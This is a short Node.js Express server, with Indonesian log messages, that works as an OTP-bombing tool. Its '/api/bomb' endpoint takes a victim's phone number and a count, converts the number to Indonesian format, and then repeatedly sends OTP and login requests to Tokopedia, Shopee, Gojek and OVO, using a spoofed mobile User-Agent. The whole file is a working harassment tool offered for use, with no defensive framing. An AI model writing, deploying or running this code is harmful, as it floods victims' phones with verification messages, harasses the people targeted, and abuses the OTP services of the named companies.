const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors()); 
app.use(express.json());

const endpoints = [
    { name: 'Tokopedia', url: 'https://accounts.tokopedia.com/api/v1/otp/register', data: (phone) => ({ phone: phone }) },
    { name: 'Shopee', url: 'https://shopee.co.id/api/v4/otp/send', data: (phone) => ({ phone: phone }) },
    { name: 'Gojek', url: 'https://api.gojekapi.com/v5/customers/login_with_phone', data: (phone) => ({ phone: phone }) },
    { name: 'OVO', url: 'https://api.ovo.id/v2.1/user/otp', data: (phone) => ({ phone: phone }) }
];

app.post('/api/bomb', async (req, res) => {
    let { target, count } = req.body;
    
    if (!target) return res.status(400).json({ status: 'error', message: 'Nomor target kosong!' });

    let cleanTarget = target.replace(/[^0-9]/g, '');
    if (cleanTarget.startsWith('0')) cleanTarget = '62' + cleanTarget.substring(1);

    res.json({ status: 'success', message: `Memulai OTP Bombing ke ${cleanTarget}` });

    for (let i = 0; i < count; i++) {
        endpoints.forEach(async (ep) => {
            try {
                await axios.post(ep.url, ep.data(cleanTarget), {
                    headers: { 
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
                        'Content-Type': 'application/json'
                    }
                });
                console.log(`[+] Sukses nembak ${ep.name}`);
            } catch (error) {
                console.log(`[-] Gagal nembak ${ep.name}`);
            }
        });
        await new Promise(r => setTimeout(r, 1000)); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server jalan di port ${PORT}`));
